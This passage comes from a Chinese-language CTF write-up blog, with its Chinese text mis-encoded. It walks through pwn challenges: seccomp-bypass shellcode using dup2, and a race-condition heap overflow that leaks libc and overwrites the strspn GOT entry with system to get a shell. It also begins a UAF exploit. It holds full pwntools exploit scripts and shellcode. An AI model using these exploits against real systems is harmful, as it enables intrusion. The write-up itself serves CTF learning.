class="line"> <span class="number">0011</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x25</span> <span class="number">0x07</span> <span class="number">0x06</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0020</span> <span class="keyword">else</span> gotco <span class="number">0019</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != write) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># write(fd, buf, count)</span></span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x25</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &lt;= <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°é¢˜ç›®è¿˜ç»™äº† dup2 ç³»ç»Ÿè°ƒç”¨ç™½åå•ï¼Œdup2 ä»‹ç»å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dup2 å¯ä»¥å¤åˆ¶ä¸€ä¸ªç°å­˜çš„æ–‡ä»¶æè¿°ç¬¦ï¼šint dup2 (int oldfd, int newfd)ã€‚</span><br><span class="line">dup2(3, 0) å³å°† flag æ–‡ä»¶æè¿°ç¬¦ 3 æ”¹æˆäº†æ–‡ä»¶æè¿°ç¬¦ 0ï¼Œå³é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ 0 å³å¯è®¿é—®åˆ° flag æ–‡ä»¶æ•°æ®ã€‚</span><br></pre></td></tr></table></figure><p>å› æ­¤åˆ©ç”¨ dup2 å¯ä»¥ç»•è¿‡ read é™åˆ¶ï¼Œåˆ©ç”¨æ²™ç®± fd å’Œç³»ç»Ÿè°ƒç”¨ fd <strong>æ•°æ®ç±»å‹ä¸ç»Ÿä¸€</strong>ç»•è¿‡ write é™åˆ¶ï¼Œorw çš„ shellcode å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">shellcode2 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub rsp, 0x2000</span></span><br><span class="line"><span class="string">mov eax, 0x67616c66 ;// flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">mov esi, eax</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall ;// open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov esi, 0</span></span><br><span class="line"><span class="string">mov eax, 33</span></span><br><span class="line"><span class="string">syscall ;// dup2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, 0</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 0x01010201</span></span><br><span class="line"><span class="string">sub edx, 0x01010101</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall ;// read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">inc eax</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rcx, 0x8000000000000000</span></span><br><span class="line"><span class="string">add rdi, rcx</span></span><br><span class="line"><span class="string">syscall ;// write</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å®Œæ•´ EXP å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./shellcode&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">allowed = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">79</span>, <span class="number">96</span>):</span><br><span class="line">    allowed += <span class="built_in">chr</span>(i)</span><br><span class="line">log.success(<span class="string">&quot;allowed===&gt;&quot;</span>+allowed)</span><br><span class="line"></span><br><span class="line">syscall = asm(<span class="string">&#x27;syscall&#x27;</span>)</span><br><span class="line"><span class="comment"># print(len(syscall))   #2</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;Input: (ye / no)&quot;</span>, syscall)</span><br><span class="line"></span><br><span class="line">shellcode1 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rsp</span></span><br><span class="line"><span class="string">pop rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>).ljust(<span class="number">17</span>, <span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(shellcode1))    #17</span></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0x14F2)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">b&quot;[5] ======== Input Your P0P Code ========\n&quot;</span>, shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sub rsp, 0x2000</span></span><br><span class="line"><span class="string">mov eax, 0x67616c66 ;// flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">mov esi, eax</span></span><br><span class="line"><span class="string">mov al, 2</span></span><br><span class="line"><span class="string">syscall ;// open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov esi, 0</span></span><br><span class="line"><span class="string">mov eax, 33</span></span><br><span class="line"><span class="string">syscall ;// dup2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, 0</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0x0000000000000100</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall ;// read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">inc eax</span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rcx, 0x8000000000000000</span></span><br><span class="line"><span class="string">add rdi, rcx</span></span><br><span class="line"><span class="string">syscall ;// write</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x12</span>+shellcode2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-heap"><a href="#4-heap" class="headerlink" title="4. heap"></a>4. heap</h2><p>èœå•é¢˜ï¼Œä½†æ˜¯åˆ©ç”¨<strong>çº¿ç¨‹</strong>æ‰§è¡Œå †æ“ä½œã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309051943811.png" alt="image-20230905194322529" style="zoom:50%;" /><p>edit ä¸­ç¡çœ äº† 1 ç§’ï¼Œå­˜åœ¨<strong>æ¡ä»¶ç«äº‰</strong>ï¼Œå¯¼è‡´äº† Heap Overflowã€‚</p><p>Wiki ä¸Šæ‰¾æ¥çš„æ¡ä»¶ç«äº‰ä»‹ç»ï¼Œç”±å¤šè¿›ç¨‹ï¼ˆçº¿ç¨‹ï¼‰å…±äº«åŒä¸€æ•°æ®åŒºåŸŸå¯¼è‡´çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¡ä»¶ç«äº‰æ˜¯æŒ‡ä¸€ä¸ªç³»ç»Ÿçš„è¿è¡Œç»“æœä¾èµ–äºä¸å—æ§åˆ¶çš„äº‹ä»¶çš„å…ˆåé¡ºåºã€‚å½“è¿™äº›ä¸å—æ§åˆ¶çš„äº‹ä»¶å¹¶æ²¡æœ‰æŒ‰ç…§å¼€å‘è€…æƒ³è¦çš„æ–¹å¼è¿è¡Œæ—¶ï¼Œå°±å¯èƒ½ä¼šå‡ºç° bugã€‚è¿™ä¸ªæœ¯è¯­æœ€åˆæ¥è‡ªäºä¸¤ä¸ªç”µä¿¡å·äº’ç›¸ç«äº‰æ¥å½±å“è¾“å‡ºç»“æœã€‚</span><br></pre></td></tr></table></figure><p><del>wp æœ‰äº›çœ‹ä¸æ‡‚ï¼Œæš‚æ—¶å…ˆä¸å¤ç›˜ã€‚</del></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨ sleep å‰å·²ç»æ‹¿åˆ°äº†å †å—çš„ index(v2) å’Œ size(v3)ï¼Œè€Œåœ¨ sleep çš„ä¸€ç§’ä¸­å‡è®¾ *(s+v2) æŒ‡å‘å¤„è¢«æ”¹å˜æˆä¸€ä¸ªå°å †å—ï¼Œå²‚ä¸æ˜¯å¯ä»¥è¿›è¡Œæº¢å‡ºäº†ï¼Ÿ</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141621995.png" alt="image-20230914162125869" style="zoom:50%;" /><p>add åªå…è®¸ç”³è¯· 0x50~0x68 å¤§å°çš„å †å—ï¼Œå¹¶é™„å¸¦ä¸€ä¸ª 0x10 å¤§å°çš„æ§åˆ¶å¤´ï¼Œæ§åˆ¶å¤´ä¸­å­˜å‚¨ç€å †å—æŒ‡é’ˆå’Œå †å—å¤§å°ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141944387.png" alt="image-20230914194435059" style="zoom:50%;" /><p>å› æ­¤å‡è®¾æˆ‘ä»¬å…ˆç”³è¯·ä¸€ä¸ª 0x68 å¤§å°çš„å †å—ï¼Œåœ¨ edit çš„ sleep è¿‡ç¨‹ä¸­é‡Šæ”¾æ‰è¯¥å †å—ï¼Œå†ç”³è¯·ä¸€ä¸ª 0x58 å¤§å°çš„å †å—ï¼Œå°±å¯ä»¥å®ç° 0x10 å¤§å°çš„å †æº¢å‡ºï¼Œç”±æ­¤æ¥ä¿®æ”¹ä¸‹ä¸€ä¸ªå †å—çš„æŒ‡é’ˆã€‚çº¿ç¨‹ç”³è¯·çš„å †å—ä¸åœ¨ [heap] ä¸‹ï¼Œä¸€èˆ¬æ˜¯ libc é™„è¿‘ mmap å‡ºçš„ä¸€å—ç©ºé—´ï¼Œæ‰€ä»¥ gdb è°ƒè¯•æœ‰äº›è´¹åŠ²ğŸ˜¶ï¼ˆsearch è°ƒè¯•å¤§æ³•ï¼‰ã€‚</p><p>é¦–å…ˆæ³„éœ² libc åŸºå€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x62</span>)  <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\xa0\x08&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#1</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309141959823.png" alt="image-20230914195949604" style="zoom:50%;" /><p>è§£é‡Šä¸€ä¸‹æ³„éœ²è¿‡ç¨‹ï¼ˆæ³¨ï¼šFreeåŠŸèƒ½ä¼šç½®é›¶heap[i]ï¼Œä½†ä¸ä¼šç½®é›¶å…¶æ§åˆ¶å¤´ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. ç”³è¯·å †å—0</span><br><span class="line">2. ä¿®æ”¹å †å—0ï¼Œå¡åœ¨sleepï¼Œæ­¤æ—¶heap[0]å’Œheap_sizeï¼ˆ0x62ï¼‰å·²ç¡®å®š</span><br><span class="line">3. é‡Šæ”¾å †å—0</span><br><span class="line">4. ç”³è¯·å †å—0ï¼Œæ‹¿å›äº†å‰ä¸€ä¸ªå †å—0çš„æ§åˆ¶å¤´ï¼Œä½†æ–°å¼€è¾Ÿäº†ä¸€ä¸ªç©ºé—´ç»™æ–°çš„å †å—0ï¼ˆæ–°æ—§å¤§å°ä¸ä¸€è‡´ï¼‰</span><br><span class="line">5. ç”³è¯·å †å—1</span><br><span class="line">6. ç­‰åˆ°sleepç»“æŸï¼Œé€šè¿‡heap[0]ä¿®æ”¹å †å—1æ§åˆ¶å¤´ï¼Œä½¿å…¶æŒ‡å‘åŒä¸€é¡µçš„main_arenaå¤„</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹æ§åˆ¶å¤´æŒ‡é’ˆæŒ‡å‘ environ æ³„éœ²å‡ºæ ˆåœ°å€ï¼Œç¬¬ä¸‰æ¬¡ä¿®æ”¹è¿”å›åœ°å€ä¸º onegadget å’Œ system(â€œ/bin/shâ€) å³å¯ã€‚</p><p>å½“ç„¶è¿™é‡Œè¿˜æœ‰å¦ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼šç¬¬äºŒæ¬¡ä¿®æ”¹æ§åˆ¶å¤´æŒ‡é’ˆæŒ‡å‘ libc çš„ got è¡¨ä¸­çš„ strspnã€‚å‚è€ƒçš„æ˜¯è¿™ä½å¸ˆå‚…çš„<a href="https://kagehutatsu.com/?p=845">2023 ç¾ŠåŸæ¯ Pwn Writeup</a>ã€‚è‡³äºä¸ºä»€ä¹ˆæ˜¯ strspnï¼Ÿè¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„ç¨‹åºä¸­è°ƒç”¨äº† strtok å‡½æ•°ï¼Œè€Œ strtok è°ƒç”¨äº† libc.got.plt ä¸­çš„ strspnï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°æ­£å¥½æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼éš¾æ€ªè¯´ ELF(â€œ./libc-2.35.soâ€) æ€»æ˜¯æ˜¾ç¤º libc çš„ GOT è¡¨æ˜¯å¯ä»¥åŠ«æŒçš„ï¼</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309142251383.png" alt="image-20230914225117957" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309142253516.png" alt="image-20230914225331345" style="zoom:50%;" /><p>å½“ç„¶è¿™ç§æ‰“æ³•ä¸€èˆ¬åœ¨å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°å¤šçš„ç¨‹åºæ‰å¥½åˆ©ç”¨ï¼Œå¦åˆ™è¿˜æ˜¯è€è€å®å®æ‰“æ ˆæº¢å‡ºå¥½ä¸€äº›ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    p = <span class="string">b&quot;1&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += content</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p = <span class="string">b&quot;2&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p = <span class="string">b&quot;3&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += <span class="built_in">str</span>(idx).encode() + <span class="string">b&quot;:&quot;</span> + content</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line">    <span class="comment"># sleep(2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p = <span class="string">b&quot;4&quot;</span> + <span class="string">b&quot; &quot;</span></span><br><span class="line">    p += <span class="built_in">str</span>(idx).encode()</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your chocie:\n\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x62</span>)  <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\xa0\x08&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#1</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">offset = <span class="number">0x7ff94dc19c80</span> - <span class="number">0x7ff94da00000</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;env ===&gt; &quot;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line">add(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x62</span>)  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x68</span>)  <span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;t&#x27;</span>*<span class="number">0x60</span> + p64(libc_base+<span class="number">0x219008</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base+<span class="number">0x219008</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x58</span>)  <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(system)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023DASå…­æœˆèµ›"><a href="#2023DASå…­æœˆèµ›" class="headerlink" title="2023DASå…­æœˆèµ›"></a>2023DASå…­æœˆèµ›</h1><h2 id="1-easynote"><a href="#1-easynote" class="headerlink" title="1. easynote"></a>1. easynote</h2><p>libc-2.23 çš„ uaf æ¼æ´ï¼Œç›´æ¥æ‰“æ¨¡æ¿ï¼Œå› ä¸ºç”¨ docker æ‰“çš„ï¼Œå¹²è„†ç›´æ¥ç”¨äº† glibc-all-in-one çš„ libc å’Œ ldã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/ctf/work/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;The length of your content ---&gt;\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content ---&gt;\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index ---&gt;\n&quot;</span>, <span 